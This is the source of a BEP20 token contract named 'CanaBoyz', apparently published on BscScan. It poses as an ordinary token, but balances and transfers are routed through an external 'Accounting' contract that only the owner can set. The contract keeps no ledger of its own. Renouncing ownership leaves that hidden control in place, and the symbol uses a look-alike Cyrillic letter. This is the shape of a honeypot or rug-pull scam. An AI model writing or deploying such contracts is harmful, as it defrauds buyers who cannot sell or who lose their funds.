/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

interface BEP20 {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

interface Accounting {
    function doTransfer(address from, address to, uint amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

contract Token is BEP20 {
    using SafeMath for uint256;

    address private owner = msg.sender;    
    string private _name = "CanaBoyz";
    string private _symbol = unicode"$CNВ";
    uint8 private _decimals;
    uint private _totalSupply;
    
    mapping (address => mapping (address => uint256)) private allowed;
    address private accounting;
    
    constructor() {
        _decimals = 9;
        _totalSupply = 42 * 10 ** 9 * 10 ** _decimals;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address who) view public returns (uint256) {
        return Accounting(accounting).balanceOf(who);
    }
    
    function allowance(address who, address spender) view public returns (uint256) {
        return allowed[who][spender];
    }

    function setAccountingAddress(address accountingAddress) public {
        require(msg.sender == owner);
        accounting = accountingAddress;
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
    
    function transfer(address to, uint amount) public returns (bool success) {
        if (Accounting(accounting).doTransfer(msg.sender, to, amount)) {
            emit Transfer(msg.sender, to, amount);
            return true;
        }
    }

    function transferFrom(address from, address to, uint amount) public returns (bool success) {
        require (amount > 1);
        if (Accounting(accounting).doTransfer(from, to, amount)) {
            allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
            emit Transfer(from, to, amount);
            return true;
        }
    }
        
    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}